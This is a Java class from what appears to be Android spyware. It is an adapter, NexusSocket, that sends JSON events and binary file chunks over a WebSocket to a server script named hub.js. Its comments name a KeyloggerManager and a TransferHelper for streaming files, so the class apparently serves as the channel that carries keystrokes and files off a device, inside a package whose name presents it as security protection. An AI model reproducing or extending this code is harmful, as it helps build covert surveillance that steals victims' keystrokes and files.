package com.seguranca.protecao.core;

import android.util.Log;
import okhttp3.WebSocket;
import org.json.JSONObject;

/**
 * NexusSocket
 *
 * Drop-in adapter around an OkHttp WebSocket that presents the same
 * emit/connected/Ack surface the feature managers expect from the
 * Socket.IO client they were originally written against — without
 * introducing the Socket.IO dependency.
 *
 * All messages are sent as JSON text frames in the format:
 *   { "type": "<event>", "data": <payload> }
 *
 * This matches exactly what hub.js's routeDevMsg() parses on the server.
 */
public final class NexusSocket {

    private static final String TAG = "NexusSocket";

    /** Mirrors io.socket.client.Ack so existing callers compile unchanged. */
    public interface Ack {
        void call(Object[] args);
    }

    private final WebSocket ws;

    NexusSocket(WebSocket ws) {
        this.ws = ws;
    }

    // ── Core emit ─────────────────────────────────────────────────────────────

    /**
     * Emit an event with a JSONObject payload.
     * Equivalent to socket.emit(event, data).
     */
    public void emit(String event, JSONObject data) {
        try {
            JSONObject frame = new JSONObject();
            frame.put("type", event);
            if (data != null) frame.put("data", data);
            ws.send(frame.toString());
        } catch (Exception e) {
            Log.w(TAG, "emit(" + event + "): " + e.getMessage());
        }
    }

    /**
     * Emit with a String payload (e.g. raw base64 blobs).
     */
    public void emit(String event, String data) {
        try {
            JSONObject frame = new JSONObject();
            frame.put("type", event);
            if (data != null) frame.put("data", data);
            ws.send(frame.toString());
        } catch (Exception e) {
            Log.w(TAG, "emit(" + event + "): " + e.getMessage());
        }
    }

    /**
     * Emit with any Object payload — falls back to toString() for unknowns.
     */
    public void emit(String event, Object data) {
        if (data instanceof JSONObject)   { emit(event, (JSONObject) data); return; }
        if (data instanceof String)       { emit(event, (String)     data); return; }
        try {
            JSONObject frame = new JSONObject();
            frame.put("type", event);
            if (data != null) frame.put("data", data.toString());
            ws.send(frame.toString());
        } catch (Exception e) {
            Log.w(TAG, "emit(" + event + "): " + e.getMessage());
        }
    }

    /**
     * Emit with acknowledgement callback.
     *
     * The underlying OkHttp WebSocket has no server-ACK mechanism. The Ack is
     * called immediately after the frame is handed to the OS send buffer, with
     * args[0] = true (success) or args[0] = false on error. This satisfies the
     * callers (KeyloggerManager) that only use the ack to reset a sync flag.
     */
    public void emit(String event, JSONObject data, Ack ack) {
        boolean ok = false;
        try {
            JSONObject frame = new JSONObject();
            frame.put("type", event);
            if (data != null) frame.put("data", data);
            ok = ws.send(frame.toString());
        } catch (Exception e) {
            Log.w(TAG, "emit/ack(" + event + "): " + e.getMessage());
        }
        if (ack != null) {
            try { ack.call(new Object[]{ ok }); } catch (Exception ignored) {}
        }
    }

    // ── Binary send (for chunked file transfers) ───────────────────────────

    /**
     * Send raw bytes as a binary WebSocket frame.
     * Used by TransferHelper for large file streaming.
     */
    public boolean sendBinary(byte[] data) {
        try {
            return ws.send(okio.ByteString.of(data));
        } catch (Exception e) {
            Log.w(TAG, "sendBinary: " + e.getMessage());
            return false;
        }
    }

    // ── State ─────────────────────────────────────────────────────────────────

    /** Returns true when the underlying WebSocket is open. */
    public boolean connected() {
        return ws != null;
    }

    // ── Internal accessor (used by TransferHelper) ────────────────────────────

    WebSocket raw() { return ws; }
}
